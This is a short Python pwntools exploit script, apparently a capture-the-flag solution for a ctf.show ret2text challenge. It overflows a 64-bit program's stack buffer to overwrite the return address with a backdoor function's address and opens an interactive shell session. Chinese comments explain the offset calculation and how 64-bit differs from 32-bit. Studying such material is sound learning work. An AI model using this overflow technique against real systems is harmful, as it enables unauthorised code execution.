from pwn import *

p = remote('pwn.challenge.ctf.show', 28251)

# offset = 0xA + 8：计算64位程序的栈溢出偏移量
# 0xA：缓冲区到saved rbp的距离（通过IDA或cyclic计算）
# 8：saved rbp的大小（64位程序，rbp为8字节）
# 总偏移量 = 0xA + 8 = 0x12，定位到返回地址
offset = 0xA + 8

# backdoor = 0x400658：64位backdoor函数的地址
# 64位程序的地址通常在0x400000附近（代码段）
backdoor = 0x400658

# payload = b'a' * offset + p64(backdoor)：构造攻击载荷
# b'a' * offset：填充垃圾数据到返回地址位置
# p64(backdoor)：将backdoor函数地址打包为64位小端序，覆盖返回地址
# 程序ret时跳转到backdoor函数执行
payload = b'a' * offset + p64(backdoor)

p.send(payload)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2text - 64位程序
2. 64位与32位的关键区别：
   - 指针大小：64位使用8字节地址，32位使用4字节
   - 使用 p64() 而非 p32() 打包地址
   - 偏移量计算：0xA + 8 = 0x12（注意8是rbp的大小）
3. 64位栈对齐问题：
   - x86-64架构要求栈在函数调用时保持16字节对齐
   - 如果栈不对齐，可能导致system等函数执行失败
   - 本题backdoor函数可能不需要严格对齐，或者已经处理好
4. 地址空间：
   - 64位地址：0x400658（高地址位为0）
   - 实际64位程序地址可能是0x0000000000400658
5. 利用流程与32位相同，只是地址打包方式不同
"""
